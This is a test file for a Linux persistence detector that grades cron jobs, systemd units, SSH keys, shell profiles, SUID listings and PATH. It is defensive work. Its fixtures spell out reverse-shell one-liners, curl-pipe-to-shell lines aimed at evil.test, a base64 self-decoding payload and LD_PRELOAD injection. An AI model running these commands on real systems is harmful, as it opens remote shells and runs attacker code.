import { describe, it, expect } from "vitest";
import {
  judgePayload,
  commandTarget,
  gradeAuthorizedKeys,
  crossAccountKeyReuse,
  gradeCron,
  gradeUnit,
  gradeShellInit,
  gradeSuid,
  gradeEnv,
  gradePathEntries,
  shadowedCommands,
  analyzeLinuxCollection,
  SUID_BASELINE,
  type LinuxContext,
} from "../../src/analysis/linuxPersistRules.js";
import { classifyLinuxArtifact, type CollectedFile } from "../../src/analysis/linuxPersistence.js";

const file = (path: string, content: string, over: Partial<CollectedFile> = {}): CollectedFile => ({
  path,
  kind: classifyLinuxArtifact(path),
  content,
  ...over,
});

const INCIDENT: LinuxContext = { incident: { start: "2026-01-01T00:00:00Z", end: "2026-01-03T00:00:00Z" } };

describe("judgePayload — what a command does, without running any of it", () => {
  it("sees a fetch piped into a shell", () => {
    expect(judgePayload("curl -s http://evil.test/a | bash").fetchExec).toBe(true);
    expect(judgePayload("wget -qO- http://evil.test/a |sh").fetchExec).toBe(true);
    expect(judgePayload('bash -c "$(curl -fsSL http://evil.test/a)"').fetchExec).toBe(true);
  });

  it("sees a reverse shell", () => {
    expect(judgePayload("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1").reverseShell).toBe(true);
    expect(judgePayload("nc -e /bin/sh 10.0.0.1 4444").reverseShell).toBe(true);
    expect(judgePayload("socat TCP:10.0.0.1:4444 EXEC:/bin/sh").reverseShell).toBe(true);
  });

  it("sees a self-decoding payload", () => {
    expect(judgePayload("echo aGk= | base64 -d | sh").encoded).toBe(true);
  });

  // Reading only the first token missed every wrapper form.
  it("sees a transient path passed as an argument, not only as the program", () => {
    expect(judgePayload("/bin/bash /tmp/.x/run.sh").transient).toBe(true);
    expect(judgePayload("/tmp/run.sh").transient).toBe(true);
  });

  it("says nothing about ordinary maintenance", () => {
    const j = judgePayload("/usr/bin/certbot renew --quiet");
    expect(j.transient || j.fetchExec || j.reverseShell || j.encoded || j.hidden).toBe(false);
  });

  it("does not call a download alone an execution", () => {
    expect(judgePayload("curl -o /var/backups/a.tgz https://vendor.test/a.tgz").fetchExec).toBe(false);
  });

  it("looks past env assignments and wrappers for the target", () => {
    expect(commandTarget("FOO=1 sudo nohup /opt/app/run")).toBe("/opt/app/run");
  });

  it("does not call an ordinary hidden config directory hidden", () => {
    expect(judgePayload("/home/alice/.local/bin/tool").hidden).toBe(false);
    expect(judgePayload("/home/alice/.hidden/tool").hidden).toBe(true);
  });
});

describe("authorized keys", () => {
  it("reports a forced command that hands out a shell", () => {
    const [s] = gradeAuthorizedKeys(
      file("/root/.ssh/authorized_keys", 'command="/bin/bash" ssh-rsa AAAA x@y'),
      {},
    );
    expect(s.severity).toBe("High");
    expect(s.mitre).toContain("T1098.004");
    expect(s.reason).toContain("root");
  });

  it("reports a forced command that opens a reverse shell", () => {
    const [s] = gradeAuthorizedKeys(
      file("/home/svc/.ssh/authorized_keys", 'command="nc -e /bin/sh 10.0.0.1 4444" ssh-rsa AAAA x@y'),
      {},
    );
    expect(s.severity).toBe("High");
    expect(s.mitre).toContain("T1059.004");
  });

  // A forced command is normally a HARDENING measure. Reporting it would punish good practice.
  it("says nothing about a forced command that restricts the key to one program", () => {
    expect(
      gradeAuthorizedKeys(
        file("/home/backup/.ssh/authorized_keys", 'command="/usr/bin/rrsync /srv",no-pty ssh-rsa AAAA b@h'),
        {},
      ),
    ).toEqual([]);
  });

  it("says nothing about an ordinary key, because a host is meant to have them", () => {
    expect(
      gradeAuthorizedKeys(file("/home/alice/.ssh/authorized_keys", "ssh-ed25519 AAAAC3 alice@laptop"), {}),
    ).toEqual([]);
  });

  it("reports an ordinary key only when the file changed inside the incident window", () => {
    const f = file("/root/.ssh/authorized_keys", "ssh-ed25519 AAAAC3 x@y", { mtime: "2026-01-02T00:00:00Z" });
    const [s] = gradeAuthorizedKeys(f, INCIDENT);
    expect(s.severity).toBe("High"); // Medium, raised because the change is inside the window
    expect(s.reason).toContain("not necessarily the one that was added");
  });

  it("honours a baseline of expected keys", () => {
    const f = file("/root/.ssh/authorized_keys", "ssh-ed25519 AAAAC3 x@y", { mtime: "2026-01-02T00:00:00Z" });
    expect(gradeAuthorizedKeys(f, { ...INCIDENT, baseline: { keys: ["AAAAC3"] } })).toEqual([]);
  });

  it("says the modification time was not collected rather than assuming nothing changed", () => {
    const [s] = gradeAuthorizedKeys(
      file("/root/.ssh/authorized_keys", 'command="/bin/sh" ssh-rsa AAAA x@y'),
      INCIDENT,
    );
    expect(s.timeUnknown).toBe(true);
    expect(s.reason).toContain("no modification time");
  });
});

describe("key reuse across accounts", () => {
  const shared = (blob: string) => [
    file("/root/.ssh/authorized_keys", `ssh-rsa ${blob} ops@jump`),
    file("/home/alice/.ssh/authorized_keys", `ssh-rsa ${blob} ops@jump`),
  ];

  it("reports one key that authorises root and a user", () => {
    const [s] = crossAccountKeyReuse(shared("AAAAB3"), {});
    expect(s.severity).toBe("High");
    expect(s.reason).toContain("root");
    expect(s.reason).toContain("legitimate pattern");
  });

  it("reports reuse between two ordinary accounts at Medium", () => {
    const [s] = crossAccountKeyReuse(
      [
        file("/home/a/.ssh/authorized_keys", "ssh-rsa Z z@z"),
        file("/home/b/.ssh/authorized_keys", "ssh-rsa Z z@z"),
      ],
      {},
    );
    expect(s.severity).toBe("Medium");
  });

  it("does not call one key listed twice in one file a reuse", () => {
    expect(
      crossAccountKeyReuse([file("/root/.ssh/authorized_keys", "ssh-rsa Z a@a\nssh-rsa Z b@b")], {}),
    ).toEqual([]);
  });

  it("honours the baseline", () => {
    expect(crossAccountKeyReuse(shared("AAAAB3"), { baseline: { keys: ["AAAAB3"] } })).toEqual([]);
  });
});

describe("cron", () => {
  const cron = (line: string, path = "/etc/crontab") => gradeCron(file(path, line), {});

  it("reports a job that runs from a world-writable directory", () => {
    const [s] = cron("*/5 * * * * root /tmp/.cache/update.sh");
    expect(s.severity).toBe("High");
    expect(s.mitre).toContain("T1053.003");
  });

  it("reports a job that downloads and executes in one command", () => {
    const [s] = cron("@reboot root curl -s http://evil.test/a | bash");
    expect(s.severity).toBe("High");
    expect(s.mitre).toContain("T1105");
  });

  it("reports root running a file a user can rewrite", () => {
    const [s] = cron("0 * * * * root /home/alice/bin/report.sh");
    expect(s.severity).toBe("High");
    expect(s.reason).toContain("that account can change what root runs");
  });

  it("says nothing about ordinary scheduled maintenance", () => {
    expect(cron("17 * * * * root cd / && run-parts --report /etc/cron.hourly")).toEqual([]);
    expect(cron("0 3 * * * root /usr/bin/certbot renew --quiet")).toEqual([]);
  });

  it("says nothing about @reboot on its own", () => {
    expect(cron("@reboot root /usr/local/bin/agent")).toEqual([]);
  });

  it("reports a crontab PATH that resolves out of the working directory", () => {
    const [s] = gradeCron(file("/var/spool/cron/crontabs/bob", "PATH=:/usr/bin\n"), {});
    expect(s.severity).toBe("High");
    expect(s.mitre).toEqual(["T1574.007"]);
    expect(s.reason).toContain("Every job in this crontab");
  });

  it("honours a baseline path", () => {
    expect(
      gradeCron(file("/etc/crontab", "*/5 * * * * root /tmp/agent"), { baseline: { paths: ["/tmp/agent"] } }),
    ).toEqual([]);
  });
});

describe("systemd", () => {
  const unit = (body: string, path = "/etc/systemd/system/x.service") => gradeUnit(file(path, body), {});

  it("reports a service that runs from a world-writable directory", () => {
    const [s] = unit(
      "[Service]\nExecStart=/dev/shm/.x/agent\nRestart=always\n[Install]\nWantedBy=multi-user.target",
    );
    expect(s.severity).toBe("High");
    expect(s.mitre).toContain("T1543.002");
    expect(s.reason).toContain("restarts automatically");
    expect(s.reason).toContain("multi-user.target");
  });

  it("reports a root service that runs a file inside a user's home directory", () => {
    const [s] = unit("[Service]\nExecStart=/home/alice/.local/bin/agent");
    expect(s.severity).toBe("High");
    expect(s.reason).toContain("change what root runs");
  });

  it("does not apply that rule to a user unit, which is meant to live there", () => {
    expect(
      unit("[Service]\nExecStart=/home/alice/.local/bin/agent", "/home/alice/.config/systemd/user/a.service"),
    ).toEqual([]);
  });

  it("reports an ExecStartPre payload, not only ExecStart", () => {
    const [s] = unit(
      '[Service]\nExecStartPre=/bin/bash -c "$(curl -fsSL http://evil.test/a)"\nExecStart=/usr/bin/true',
    );
    expect(s.severity).toBe("High");
  });

  it("says nothing about an ordinary service", () => {
    expect(
      unit(
        "[Unit]\nDescription=Web\n[Service]\nUser=www-data\nExecStart=/usr/sbin/nginx -g 'daemon off;'\nRestart=always",
      ),
    ).toEqual([]);
  });
});

describe("shell initialization", () => {
  const rc = (body: string) => gradeShellInit(file("/home/alice/.bashrc", body), {});

  it("reports a line that fetches and executes on every login", () => {
    const [s] = rc("curl -s http://evil.test/a | bash");
    expect(s.severity).toBe("High");
    expect(s.mitre).toContain("T1546.004");
    expect(s.reason).toContain("every time the account opens a shell");
  });

  it("reports a payload in a hidden directory", () => {
    const [s] = rc("/home/alice/.x/agent &");
    expect(s.severity).toBe("Medium");
  });

  it("reports PATH resolving out of the working directory", () => {
    const [s] = rc("export PATH=.:$PATH");
    expect(s.severity).toBe("High");
    expect(s.mitre).toEqual(["T1574.007"]);
  });

  it("reports a writable directory placed before the system ones", () => {
    const [s] = rc("export PATH=/home/alice/.bin:/usr/bin:/bin");
    expect(s.severity).toBe("Medium");
  });

  // THE most common line in any shell profile. Deleting the $PATH reference left a leading colon,
  // which IS an empty entry, which means the current working directory — so every ordinary profile
  // on every host produced a High finding.
  it("says nothing about appending a directory after the system ones", () => {
    expect(rc("export PATH=$PATH:/home/alice/bin")).toEqual([]);
    expect(rc("export PATH=${PATH}:/opt/tools/bin")).toEqual([]);
    expect(rc("PATH=$PATH:/usr/local/go/bin")).toEqual([]);
  });

  it("still reports the working directory when it is prepended to the inherited PATH", () => {
    expect(rc("export PATH=.:$PATH")[0].severity).toBe("High");
    expect(rc("export PATH=/tmp/bin:$PATH")[0].severity).toBe("Medium");
  });

  it("reports history suppression", () => {
    const [s] = rc("unset HISTFILE");
    expect(s.mitre).toEqual(["T1070.003"]);
    expect(rc("export HISTFILE=/dev/null")[0].severity).toBe("Medium");
  });

  // Ubuntu's own /etc/skel/.bashrc ships these uncommented. A rule that fires on the NAME produced
  // two Medium events for every home directory on every Debian-family host.
  it("says nothing about the aliases every Linux host and every developer Mac ships", () => {
    for (const line of [
      "alias ls='ls --color=auto'",
      "alias grep='grep --color=auto'",
      "alias ll='ls -alF'",
      "alias cat='bat'",
      "alias top='htop'",
      "alias du='dust'",
      "alias vim=nvim",
    ]) {
      expect(rc(line), line).toEqual([]);
    }
  });

  it("reports an alias that hides lines from an enumeration command", () => {
    const [s] = rc("alias ls='ls --color=auto | grep -v .x'");
    expect(s.mitre).toEqual(["T1564"]);
    expect(s.reason).toContain("REMOVES lines");
  });

  it("reports an alias whose body is a payload", () => {
    const [s] = rc("alias sudo='curl -s http://evil.test/a | sh'");
    expect(s.severity).toBe("High");
    expect(s.mitre).toContain("T1546.004");
  });

  it("says nothing about an ordinary profile", () => {
    expect(
      rc("# colours\nexport EDITOR=vim\nalias ll='ls -alF'\n[ -f ~/.bash_aliases ] && . ~/.bash_aliases"),
    ).toEqual([]);
  });
});

describe("SUID listings", () => {
  const suid = (body: string, ctx: LinuxContext = {}) => gradeSuid(file("suid.txt", body), ctx);

  it("says nothing about the standard install set", () => {
    expect(suid(SUID_BASELINE.slice(0, 10).join("\n"))).toEqual([]);
  });

  it("reports a setuid interpreter", () => {
    const [s] = suid("-rwsr-xr-x 1 root root 100 Jan 1 10:00 /usr/bin/python3.11");
    expect(s.severity).toBe("High");
    expect(s.mitre).toEqual(["T1548.001"]);
  });

  it("reports a setuid binary in a writable directory", () => {
    expect(suid("/tmp/.x/rootme")[0].severity).toBe("High");
    expect(suid("/home/alice/bin/helper")[0].severity).toBe("High");
  });

  it("reports a setuid binary outside every install directory", () => {
    expect(suid("/srv/app/helper")[0].severity).toBe("High");
  });

  // Third-party packages do add setuid binaries. Calling that an implant is the wrong claim.
  it("reports an unknown one inside a standard directory at Medium, and says why", () => {
    const [s] = suid("/usr/bin/vendor-helper");
    expect(s.severity).toBe("Medium");
    expect(s.reason).toContain("package list");
  });

  it("honours an environment baseline", () => {
    expect(suid("/usr/bin/vendor-helper", { baseline: { suid: ["/usr/bin/vendor-helper"] } })).toEqual([]);
  });

  it("believes a listing that says the file is not setuid", () => {
    expect(suid("-rwxr-xr-x 1 root root 100 Jan 1 10:00 /usr/bin/vendor-helper")).toEqual([]);
  });

  it("notes a non-root owner", () => {
    const [s] = suid("-rwsr-xr-x 1 alice alice 100 Jan 1 10:00 /usr/bin/vendor-helper");
    expect(s.reason).toContain("owned by alice");
  });
});

describe("PATH", () => {
  it("grades the current-directory forms the same way", () => {
    for (const v of [[""], ["."], ["./"]])
      expect(gradePathEntries([...v, "/usr/bin"])?.severity).toBe("High");
  });

  it("grades a writable directory before the system ones", () => {
    expect(gradePathEntries(["/tmp/bin", "/usr/bin"])?.severity).toBe("Medium");
  });

  it("says nothing about an ordinary PATH", () => {
    expect(
      gradePathEntries(["/usr/local/sbin", "/usr/local/bin", "/usr/sbin", "/usr/bin", "/sbin", "/bin"]),
    ).toBeNull();
  });

  it("says nothing about a writable directory placed after the system ones", () => {
    expect(gradePathEntries(["/usr/bin", "/bin", "/home/alice/bin"])).toBeNull();
  });

  it("grades an /etc/environment dump", () => {
    const [s] = gradeEnv(file("/etc/environment", 'PATH="/usr/bin:.:/bin"'), {});
    expect(s.severity).toBe("High");
  });
});

describe("suspicious command resolution", () => {
  it("names the command a directory earlier in PATH would intercept", () => {
    expect(shadowedCommands(["/tmp/bin", "/usr/bin"], ["/tmp/bin/ls", "/usr/bin/passwd"])).toEqual([
      "/tmp/bin/ls",
    ]);
  });

  it("returns nothing when the collection lists no files in that directory", () => {
    expect(shadowedCommands(["/tmp/bin", "/usr/bin"], [])).toEqual([]);
  });

  it("ignores a shadow that sits after the system directories", () => {
    expect(shadowedCommands(["/usr/bin", "/tmp/bin"], ["/tmp/bin/ls"])).toEqual([]);
  });
});

describe("analyzeLinuxCollection", () => {
  it("grades every artifact class in one collection", () => {
    const signals = analyzeLinuxCollection([
      file("/root/.ssh/authorized_keys", 'command="/bin/bash" ssh-rsa AAAA x@y'),
      file("/etc/crontab", "*/5 * * * * root /tmp/.x/run.sh"),
      file("/etc/systemd/system/x.service", "[Service]\nExecStart=/dev/shm/agent"),
      file("/home/alice/.bashrc", "curl -s http://evil.test/a | sh"),
      file("suid.txt", "/tmp/rootme"),
      file("/etc/environment", "PATH=.:/usr/bin"),
    ]);
    expect(new Set(signals.map((s) => s.kind))).toEqual(
      new Set(["authorized_keys", "cron", "systemd", "shellrc", "suid", "env"]),
    );
    expect(signals.every((s) => s.severity === "High")).toBe(true);
  });

  it("returns nothing for a clean host", () => {
    expect(
      analyzeLinuxCollection([
        file("/root/.ssh/authorized_keys", "ssh-ed25519 AAAAC3 ops@jump"),
        file("/etc/crontab", "17 * * * * root cd / && run-parts --report /etc/cron.hourly"),
        file("/etc/systemd/system/nginx.service", "[Service]\nUser=www-data\nExecStart=/usr/sbin/nginx"),
        file("/home/alice/.bashrc", "alias ll='ls -alF'"),
        file("suid.txt", SUID_BASELINE.join("\n")),
        file("/etc/environment", "PATH=/usr/local/bin:/usr/bin:/bin"),
      ]),
    ).toEqual([]);
  });

  it("joins a PATH and a listing into a command-resolution finding", () => {
    const signals = analyzeLinuxCollection([
      file("/etc/environment", "PATH=/usr/local/lib/x:/usr/bin"),
      file("suid.txt", "/usr/local/lib/x/ls"),
    ]);
    expect(signals.some((s) => s.reason.includes("runs the file found there"))).toBe(true);
  });

  it("ignores an artifact class it does not read", () => {
    expect(analyzeLinuxCollection([file("/var/log/syslog", "anything")])).toEqual([]);
  });
});

// Every one of these was a real defect found in review, reproduced against a real host's files.
describe("regressions", () => {
  const suid = (body: string) => gradeSuid(file("suid.txt", body), {});

  // A stock Ubuntu host has one setuid binary per snap revision and one per container layer.
  // Dozens to hundreds of High rows, which then filled the cap and evicted the real findings.
  it("says nothing about a distribution binary inside a snap or container layer", () => {
    for (const path of [
      "/snap/core22/1122/usr/bin/sudo",
      "/snap/core20/2015/usr/bin/su",
      "/var/lib/docker/overlay2/9f3c/diff/usr/bin/mount",
      "/var/lib/containers/storage/overlay/aa/diff/usr/bin/passwd",
      "/nix/store/abc123-shadow-4.13/bin/su",
    ]) {
      expect(suid(`-rwsr-xr-x 1 root root 100 Jan  1 10:00 ${path}`), path).toEqual([]);
    }
  });

  it("still reports an implant inside a container layer", () => {
    expect(suid("/var/lib/docker/overlay2/9f3c/diff/usr/bin/python3.11")[0].severity).toBe("High");
    expect(suid("/snap/core22/1122/tmp/rootme")[0].severity).toBe("High");
  });

  // The cross-file findings ran after the per-file loop, so the signal cap evicted them.
  it("keeps the shared-key finding when a host produces hundreds of SUID rows", () => {
    const noise = Array.from({ length: 400 }, (_v, i) => `/srv/app-${i}/helper`).join("\n");
    const signals = analyzeLinuxCollection([
      file("suid.txt", noise),
      file("/root/.ssh/authorized_keys", "ssh-rsa SHARED ops@jump"),
      file("/home/bob/.ssh/authorized_keys", "ssh-rsa SHARED ops@jump"),
    ]);
    expect(signals.some((s) => s.reason.includes("The same SSH key authorises"))).toBe(true);
  });

  // /usr/local/bin/backup.sh >> /tmp/backup.log runs from /usr/local/bin. /tmp is a log target.
  it("does not claim a job runs from a world-writable directory it only writes to", () => {
    const [s] = gradeCron(
      file("/etc/crontab", "*/5 * * * * root /usr/local/bin/backup.sh >> /tmp/backup.log 2>&1"),
      {},
    );
    expect(s.severity).toBe("Medium");
    expect(s.reason).toContain("references a world-writable directory");
    expect(s.reason).not.toContain("runs from a world-writable");
  });

  it("still says a job runs from one when the program itself is there", () => {
    const [s] = gradeCron(file("/etc/crontab", "*/5 * * * * root /tmp/.x/run.sh"), {});
    expect(s.severity).toBe("High");
    expect(s.reason).toContain("runs from a world-writable");
  });

  // PATH="$PATH:/home/x" appends. Two graders skipped the expansion and reported the opposite.
  it("expands $PATH in an environment file and a crontab, as the shell grader does", () => {
    expect(gradeEnv(file("/etc/environment", 'PATH="$PATH:/home/deploy/bin"'), {})).toEqual([]);
    expect(gradeCron(file("/etc/crontab", "PATH=$PATH:/opt/tools/bin\n"), {})).toEqual([]);
  });

  // ~/.local/bin is created by `pip install --user` and prepended by Ubuntu's stock .profile.
  it("says nothing about the user bin directories every distribution creates", () => {
    for (const dir of [
      "/home/alice/.local/bin",
      "/home/alice/.cargo/bin",
      "/home/alice/.nvm/versions/node/bin",
    ]) {
      expect(gradePathEntries([dir, "/usr/bin", "/bin"]), dir).toBeNull();
    }
    expect(gradePathEntries(["/home/alice/.hidden/bin", "/usr/bin"])?.severity).toBe("Medium");
  });

  // ~/.local/share/systemd/user is a user unit and never runs as root.
  it("does not call a user unit a system-wide root service", () => {
    expect(
      gradeUnit(
        file(
          "/home/alice/.local/share/systemd/user/syncthing.service",
          "[Service]\nExecStart=/home/alice/bin/syncthing",
        ),
        {},
      ),
    ).toEqual([]);
  });

  // ExecStopPost runs on every failure — for a unit that fails on purpose, a reliable trigger.
  it("reads every systemd key that runs something, not only ExecStart", () => {
    for (const key of ["ExecStop", "ExecStopPost", "ExecReload"]) {
      const [s] = gradeUnit(
        file("/etc/systemd/system/x.service", `[Service]\nExecStart=/usr/bin/true\n${key}=/tmp/.x/agent`),
        {},
      );
      expect(s?.severity, key).toBe("High");
    }
  });

  it("reads a preload set through Environment=", () => {
    const [s] = gradeUnit(
      file(
        "/etc/systemd/system/x.service",
        "[Service]\nExecStart=/usr/bin/true\nEnvironment=LD_PRELOAD=/tmp/evil.so",
      ),
      {},
    );
    expect(s?.severity).toBe("High");
  });

  // Every EC2, Debian and RHEL cloud image ships this exact shape.
  it("does not call cloud-init's neutered root key a shared key", () => {
    const forced =
      'command="echo \'Please login as the user \\"ubuntu\\" rather than the user \\"root\\".\';echo;sleep 10;exit 142"';
    expect(
      crossAccountKeyReuse(
        [
          file("/root/.ssh/authorized_keys", `${forced} ssh-rsa LAUNCHKEY launch@aws`),
          file("/home/ubuntu/.ssh/authorized_keys", "ssh-rsa LAUNCHKEY launch@aws"),
        ],
        {},
      ),
    ).toEqual([]);
  });

  it("still reports a genuinely shared root key", () => {
    expect(
      crossAccountKeyReuse(
        [
          file("/root/.ssh/authorized_keys", "ssh-rsa SHARED ops@jump"),
          file("/home/bob/.ssh/authorized_keys", "ssh-rsa SHARED ops@jump"),
        ],
        {},
      )[0].severity,
    ).toBe("High");
  });

  it("reports a preload set through an authorized key's environment option", () => {
    const [s] = gradeAuthorizedKeys(
      file("/home/svc/.ssh/authorized_keys", 'environment="LD_PRELOAD=/tmp/evil.so" ssh-rsa AAAA x@y'),
      {},
    );
    expect(s.severity).toBe("High");
    expect(s.mitre).toContain("T1574.006");
  });

  it("reports a forced command that spawns a shell through an interpreter", () => {
    const [s] = gradeAuthorizedKeys(
      file(
        "/home/svc/.ssh/authorized_keys",
        `command="python3 -c 'import pty;pty.spawn(\\"/bin/sh\\")'" ssh-rsa AAAA x@y`,
      ),
      {},
    );
    expect(s.severity).toBe("High");
  });

  // A payload piped into python or perl is the same technique as one piped into sh.
  it("sees a fetch piped into an interpreter other than a shell", () => {
    for (const cmd of [
      "curl -s http://evil.test/a | python3 -",
      "wget -qO- http://evil.test/a | perl",
      "curl -s http://evil.test/a | node",
    ]) {
      expect(judgePayload(cmd).fetchExec, cmd).toBe(true);
    }
  });

  // 40,000 characters took 1.8 seconds in one call; a collected crontab took 24 SECONDS.
  it("bounds the work on a pathological command line", () => {
    const started = Date.now();
    for (const cmd of [`nc -${"e".repeat(40_000)}`, `python -c ${"urlopen ".repeat(20_000)}`]) {
      judgePayload(cmd);
    }
    expect(Date.now() - started).toBeLessThan(500);
  });

  // /etc/cron.daily holds plain scripts run by run-parts, and nothing in them was ever read.
  it("reads the run-parts drop directories", () => {
    expect(classifyLinuxArtifact("/etc/cron.daily/backup")).toBe("shellrc");
    const signals = analyzeLinuxCollection([
      file("/etc/cron.daily/backup", "curl -s http://evil.test/a | sh"),
    ]);
    expect(signals[0].severity).toBe("High");
  });
});
